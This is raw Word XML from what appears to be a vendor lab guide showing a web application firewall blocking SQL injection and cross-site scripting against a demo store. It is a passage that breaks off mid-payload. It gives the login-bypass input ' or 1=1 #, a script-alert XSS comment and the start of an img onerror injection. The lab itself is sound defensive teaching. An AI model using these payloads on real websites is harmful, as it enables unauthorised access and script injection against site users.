      <w:r w:rsidR="0EE8D197">
        <w:t xml:space="preserve">Injection, </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">but this time </w:t>
      </w:r>
      <w:r w:rsidR="396B91D6">
        <w:t xml:space="preserve">through the </w:t>
      </w:r>
      <w:r w:rsidR="4DEA9A18">
        <w:t>WAF-as-a-Service</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CC3A12B" w14:textId="7BE4DD2C" w:rsidR="000E4B46" w:rsidRDefault="000E4B46" w:rsidP="000E4B46">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Browse to your </w:t>
      </w:r>
      <w:r w:rsidRPr="00662E89">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CNAME</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, for example </w:t>
      </w:r>
      <w:hyperlink r:id="rId42" w:history="1">
        <w:r w:rsidRPr="006B31C7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>http://app######.prod.cudawaas.com/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2A1B39F2" w14:textId="3EFE53A4" w:rsidR="3124AFFF" w:rsidRDefault="3124AFFF" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>You will see you are an Unregistered User as shown near the top of the web page.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DDB9757" w14:textId="2C49B980" w:rsidR="002E6717" w:rsidRDefault="002E6717" w:rsidP="002E6717">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="235E35A0" wp14:editId="7C1C3220">
            <wp:extent cx="1924050" cy="4471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1924050" cy="447138"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AE84C15" w14:textId="33CC8CCB" w:rsidR="55E0BB2E" w:rsidRDefault="3124AFFF" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Click </w:t>
      </w:r>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Login / </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Register</w:t>
      </w:r>
      <w:r>
        <w:t>, and</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> enter </w:t>
      </w:r>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>' or 1=1 #</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in the email </w:t>
      </w:r>
      <w:r w:rsidR="008C2437">
        <w:t>address, then</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> click </w:t>
      </w:r>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Login</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="22E156ED" wp14:editId="4CB2F0CD">
            <wp:extent cx="3114675" cy="1537372"/>
            <wp:effectExtent l="0" t="0" r="0" b="5715"/>
            <wp:docPr id="1993243644" name="Picture 199324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2436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14675" cy="1537372"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C1815B0" w14:textId="76E3C077" w:rsidR="00822AE6" w:rsidRDefault="00822AE6" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You </w:t>
      </w:r>
      <w:r w:rsidR="002E6717">
        <w:t xml:space="preserve">will </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">get a block page because the </w:t>
      </w:r>
      <w:r w:rsidR="4DEA9A18">
        <w:t>WAF-as-a-Service</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="159E5C3B">
        <w:t xml:space="preserve">blocks the </w:t>
      </w:r>
      <w:r>
        <w:t>SQL injection attack</w:t>
      </w:r>
      <w:r w:rsidR="4552CDEE">
        <w:t xml:space="preserve">, and this attack never </w:t>
      </w:r>
      <w:r w:rsidR="00F2573C">
        <w:t xml:space="preserve">even makes </w:t>
      </w:r>
      <w:r w:rsidR="4552CDEE">
        <w:t>it to the web server.</w:t>
      </w:r>
      <w:r w:rsidR="6C021056">
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidR="00ED048B">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3383FD9B" wp14:editId="4FE5FAA9">
            <wp:extent cx="4952998"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4952998" cy="1371600"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4344BA51" w14:textId="77777777" w:rsidR="00F2573C" w:rsidRDefault="00F2573C" w:rsidP="00F2573C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5FA85127" w14:textId="1A5B7FDB" w:rsidR="00A902BF" w:rsidRDefault="00802A7C" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>In WAF-as-a-Service, g</w:t>
      </w:r>
      <w:r w:rsidR="00A902BF">
        <w:t xml:space="preserve">o to the Logs component, choose firewall logs, and you will see the log entry with the event ID </w:t>
      </w:r>
      <w:r w:rsidR="00D57F67">
        <w:t xml:space="preserve">and details of the SQL Injection attack </w:t>
      </w:r>
      <w:r w:rsidR="00A902BF">
        <w:t>as shown here</w:t>
      </w:r>
      <w:r w:rsidR="14363DF3">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0000459B">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="58F74A8F" wp14:editId="564202BE">
            <wp:extent cx="5943600" cy="928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928370"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="50AEE824" w14:textId="610C9A79" w:rsidR="0000459B" w:rsidRDefault="0000459B" w:rsidP="00172641">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B8EF54A" w14:textId="77777777" w:rsidR="0000459B" w:rsidRDefault="0000459B" w:rsidP="00172641"/>
    <w:p w14:paraId="409BA73E" w14:textId="6B23E33C" w:rsidR="007333E7" w:rsidRDefault="002D2B05" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="49" w:name="_Toc318477600"/>
      <w:bookmarkStart w:id="50" w:name="_Toc72791972"/>
      <w:r>
        <w:t xml:space="preserve">OWASP # 3 </w:t>
      </w:r>
      <w:r w:rsidR="3364FC50">
        <w:t xml:space="preserve">Blocking </w:t>
      </w:r>
      <w:r w:rsidR="007333E7">
        <w:t xml:space="preserve">Cross-Site Scripting </w:t>
      </w:r>
      <w:del w:id="51" w:author="Tushar Richabadas" w:date="2021-05-07T11:14:00Z">
        <w:r w:rsidR="007333E7" w:rsidDel="007333E7">
          <w:delText>( also</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="52" w:author="Tushar Richabadas" w:date="2021-05-07T11:14:00Z">
        <w:r w:rsidR="27629492">
          <w:t>(also</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="60184D0B">
        <w:t xml:space="preserve"> known as </w:t>
      </w:r>
      <w:del w:id="53" w:author="Tushar Richabadas" w:date="2021-05-07T11:14:00Z">
        <w:r w:rsidR="007333E7" w:rsidDel="007333E7">
          <w:delText>XSS )</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="54" w:author="Tushar Richabadas" w:date="2021-05-07T11:14:00Z">
        <w:r w:rsidR="49962E41">
          <w:t>XSS)</w:t>
        </w:r>
      </w:ins>
      <w:bookmarkEnd w:id="49"/>
      <w:bookmarkEnd w:id="50"/>
    </w:p>
    <w:p w14:paraId="4F5CA8D9" w14:textId="5B8CBC7C" w:rsidR="006B1901" w:rsidRDefault="7585BB05" w:rsidP="00545E01">
      <w:pPr>
        <w:pStyle w:val="Quote"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r w:rsidRPr="32A65B76">
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidR="006B1901" w:rsidRPr="32A65B76">
        <w:t xml:space="preserve">People are complaining they are getting viruses and strange behavior when they go to </w:t>
      </w:r>
      <w:r w:rsidR="55A69C83" w:rsidRPr="32A65B76">
        <w:t xml:space="preserve">our </w:t>
      </w:r>
      <w:r w:rsidR="64D12C73" w:rsidRPr="32A65B76">
        <w:t>w</w:t>
      </w:r>
      <w:r w:rsidR="006B1901" w:rsidRPr="32A65B76">
        <w:t xml:space="preserve">ebsite. They </w:t>
      </w:r>
      <w:r w:rsidR="00802A7C">
        <w:t xml:space="preserve">will not </w:t>
      </w:r>
      <w:r w:rsidR="006B1901" w:rsidRPr="32A65B76">
        <w:t xml:space="preserve">shop with </w:t>
      </w:r>
      <w:r w:rsidR="3F61194C" w:rsidRPr="32A65B76">
        <w:t>us</w:t>
      </w:r>
      <w:r w:rsidR="006B1901" w:rsidRPr="32A65B76">
        <w:t xml:space="preserve"> if they </w:t>
      </w:r>
      <w:r w:rsidR="00802A7C">
        <w:t>can’t</w:t>
      </w:r>
      <w:r w:rsidR="006B1901" w:rsidRPr="32A65B76">
        <w:t xml:space="preserve"> trust the reputation of </w:t>
      </w:r>
      <w:r w:rsidR="042FE6B0" w:rsidRPr="32A65B76">
        <w:t>our</w:t>
      </w:r>
      <w:r w:rsidR="006B1901" w:rsidRPr="32A65B76">
        <w:t xml:space="preserve"> online store.</w:t>
      </w:r>
      <w:del w:id="55" w:author="Nitzan Miron" w:date="2021-05-13T15:46:00Z">
        <w:r w:rsidR="006B1901" w:rsidRPr="32A65B76" w:rsidDel="3F61194C">
          <w:delText>“</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="56" w:author="Nitzan Miron" w:date="2021-05-13T15:46:00Z">
        <w:r w:rsidR="3E060F4B" w:rsidRPr="32A65B76">
          <w:t>"</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="609F2123" w14:textId="5D59102F" w:rsidR="00457F40" w:rsidRDefault="41C54F88" w:rsidP="00172641">
      <w:r w:rsidRPr="55E0BB2E">
        <w:t>We will now execute</w:t>
      </w:r>
      <w:r w:rsidR="003A2A06" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="57" w:author="Nitzan Miron" w:date="2021-05-13T15:46:00Z">
        <w:r w:rsidR="003A2A06" w:rsidRPr="55E0BB2E" w:rsidDel="003A2A06">
          <w:delText xml:space="preserve">a </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="1DE0F91E" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">two </w:t>
      </w:r>
      <w:r w:rsidR="00545E01">
        <w:t xml:space="preserve">Cross-Site </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00545E01">
        <w:t xml:space="preserve">Scripting </w:t>
      </w:r>
      <w:r w:rsidR="006B1901" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00545E01">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00545E01">
        <w:t xml:space="preserve"> XSS ) </w:t>
      </w:r>
      <w:r w:rsidR="3F12B8A7" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">attacks </w:t>
      </w:r>
      <w:r w:rsidR="006B1901" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">against </w:t>
      </w:r>
      <w:r w:rsidR="4DEA9A18" w:rsidRPr="55E0BB2E">
        <w:t>WAF-as-a-Service</w:t>
      </w:r>
      <w:r w:rsidR="4272C4B7" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00802A7C">
        <w:t xml:space="preserve">which will </w:t>
      </w:r>
      <w:r w:rsidR="009F40FB" w:rsidRPr="55E0BB2E">
        <w:t>stop</w:t>
      </w:r>
      <w:r w:rsidR="1989830E" w:rsidRPr="55E0BB2E">
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="009F40FB" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00802A7C">
        <w:t xml:space="preserve">these </w:t>
      </w:r>
      <w:r w:rsidR="1989830E" w:rsidRPr="55E0BB2E">
        <w:t>attack</w:t>
      </w:r>
      <w:r w:rsidR="00802A7C">
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="1989830E" w:rsidRPr="55E0BB2E">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00802A7C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="356A20EA" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="008C2437" w:rsidRPr="55E0BB2E">
        <w:t>First,</w:t>
      </w:r>
      <w:r w:rsidR="356A20EA" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> we will do a simple XSS </w:t>
      </w:r>
      <w:r w:rsidR="008C2437" w:rsidRPr="55E0BB2E">
        <w:t>attack,</w:t>
      </w:r>
      <w:r w:rsidR="356A20EA" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> then a more advanced one.  Both will be blocked</w:t>
      </w:r>
      <w:r w:rsidR="51400ED1" w:rsidRPr="55E0BB2E">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26783ADC" w14:textId="77777777" w:rsidR="00232A20" w:rsidRDefault="00044F20" w:rsidP="00044F20">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t>Cross-Site Scripting defense is enabled by default on WAF-as-a-Service, so as soon as you deploy WAF-as-a-Service, you are protected.</w:t>
      </w:r>
      <w:r w:rsidR="00232A20">
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0952C46E" w14:textId="3EF3B51F" w:rsidR="00044F20" w:rsidRDefault="00232A20" w:rsidP="00044F20">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>We will just be testing the protection in this lesson.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2184C245" w14:textId="30EC40DB" w:rsidR="00802A7C" w:rsidRDefault="007B3BC3" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Browse to your </w:t>
      </w:r>
      <w:r w:rsidRPr="0015168C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CNAME</w:t>
      </w:r>
      <w:r w:rsidR="0015168C">
        <w:t>, for</w:t>
      </w:r>
      <w:r w:rsidR="00390F68" w:rsidRPr="00802A7C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00802A7C" w:rsidRPr="00802A7C">
        <w:t xml:space="preserve">example: </w:t>
      </w:r>
      <w:hyperlink r:id="rId45" w:history="1">
        <w:r w:rsidR="00802A7C" w:rsidRPr="001C741A">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://app####.prod.cudawaas.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00C90B83" w:rsidRPr="00802A7C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0190ACD5" w14:textId="1BFEAB83" w:rsidR="006B1901" w:rsidRDefault="006B1901" w:rsidP="006552BA">
      <w:pPr>
        <w:pStyle w:val="Quote"/>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The comment field of the guestbook is vulnerable to </w:t>
      </w:r>
      <w:r w:rsidR="00457F40">
        <w:t>XSS injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A61B425" w14:textId="77777777" w:rsidR="006552BA" w:rsidRDefault="31E18100" w:rsidP="006552BA">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidR="0044252F" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">lick on </w:t>
      </w:r>
      <w:r w:rsidR="0044252F" w:rsidRPr="006552BA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Sign Guestbook</w:t>
      </w:r>
      <w:r w:rsidR="0044252F" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="00463776" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">put in your name and </w:t>
      </w:r>
      <w:r w:rsidR="65019FBB" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">your </w:t>
      </w:r>
      <w:r w:rsidR="00463776" w:rsidRPr="55E0BB2E">
        <w:t>email address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17BE2C7E" w14:textId="65C38F6A" w:rsidR="006B1901" w:rsidRDefault="000B6F01" w:rsidP="006552BA">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For the comment, put this exact </w:t>
      </w:r>
      <w:r w:rsidR="119F0734" w:rsidRPr="55E0BB2E">
        <w:t>text below</w:t>
      </w:r>
      <w:r w:rsidR="006552BA">
        <w:t>. Y</w:t>
      </w:r>
      <w:r w:rsidR="00457F40" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">ou </w:t>
      </w:r>
      <w:r w:rsidR="00DD0E51" w:rsidRPr="55E0BB2E">
        <w:t>can copy and paste</w:t>
      </w:r>
      <w:r w:rsidR="006552BA">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="761C35B1" w14:textId="5547939F" w:rsidR="007333E7" w:rsidRPr="008B27D5" w:rsidRDefault="001E79D3" w:rsidP="008B27D5">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008B27D5">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
        </w:rPr>
        <w:t>&lt;script&gt;</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008B27D5">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
        </w:rPr>
        <w:t>alert(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008B27D5">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
        </w:rPr>
        <w:t>'go to terriblestore.com for lower prices!');&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14287ED8" w14:textId="77777777" w:rsidR="008B27D5" w:rsidRDefault="007708D2" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidR="000E572F" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">his XSS </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">attempt </w:t>
      </w:r>
      <w:r w:rsidR="1D6E91B8" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">is blocked by </w:t>
      </w:r>
      <w:r w:rsidR="4DEA9A18" w:rsidRPr="55E0BB2E">
        <w:t>WAF-as-a-Service</w:t>
      </w:r>
      <w:r w:rsidR="009F40FB" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidR="4E69839F" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">never reaches </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidR="62D4BB4F" w:rsidRPr="55E0BB2E">
        <w:t>Backend Server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E2DB4CA" w14:textId="64C52086" w:rsidR="00B35D5D" w:rsidRDefault="008B27D5" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>View the Firewall logs to see the details of this attack</w:t>
      </w:r>
      <w:r w:rsidR="62D4BB4F" w:rsidRPr="55E0BB2E">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B22E84C" w14:textId="010775EA" w:rsidR="00B35D5D" w:rsidRDefault="46BDC173" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="50C40F79">
        <w:t xml:space="preserve">Let us do another XSS attack, </w:t>
      </w:r>
      <w:r w:rsidR="73496234" w:rsidRPr="50C40F79">
        <w:t>this time slightly more advanced</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12C9C7AE" w14:textId="048DC256" w:rsidR="472AB206" w:rsidRDefault="472AB206" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">Click on </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Sign Guestbook</w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">, put in your name and your email address, and leave this </w:t>
      </w:r>
      <w:r w:rsidR="00020B02">
        <w:t xml:space="preserve">exact </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t>text below as the comment</w:t>
      </w:r>
      <w:r w:rsidR="00020B02">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00020B02">
        <w:t>( copy</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00020B02">
        <w:t xml:space="preserve"> and paste is recommended )</w:t>
      </w:r>
      <w:r w:rsidR="00662036">
        <w:t>.  Note that even after pasting, you may need to fix up quotes and/or hyphens, so please make sure it is this exact text:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C1D6A0D" w14:textId="6F93D263" w:rsidR="00B35D5D" w:rsidRPr="00620DAF" w:rsidRDefault="46BDC173" w:rsidP="00172641">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cordia New" w:hAnsi="Cordia New" w:cs="Cordia New"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="1D1C1D"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00620DAF">
        <w:rPr>
          <w:rFonts w:ascii="Cordia New" w:hAnsi="Cordia New" w:cs="Cordia New" w:hint="cs"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="1D1C1D"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00620DAF">
        <w:rPr>
          <w:rFonts w:ascii="Cordia New" w:hAnsi="Cordia New" w:cs="Cordia New" w:hint="cs"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="1D1C1D"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>img</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00620DAF">
        <w:rPr>
          <w:rFonts w:ascii="Cordia New" w:hAnsi="Cordia New" w:cs="Cordia New" w:hint="cs"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="1D1C1D"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00620DAF">
        <w:rPr>
          <w:rFonts w:ascii="Cordia New" w:hAnsi="Cordia New" w:cs="Cordia New" w:hint="cs"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="1D1C1D"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00620DAF">
        <w:rPr>
          <w:rFonts w:ascii="Cordia New" w:hAnsi="Cordia New" w:cs="Cordia New" w:hint="cs"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="1D1C1D"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>=1 onerror="s=</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00620DAF">
        <w:rPr>
          <w:rFonts w:ascii="Cordia New" w:hAnsi="Cordia New" w:cs="Cordia New" w:hint="cs"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="1D1C1D"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>document.createElement</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00620DAF">
        <w:rPr>
          <w:rFonts w:ascii="Cordia New" w:hAnsi="Cordia New" w:cs="Cordia New" w:hint="cs"/>
          <w:b/>
          <w:bCs/>
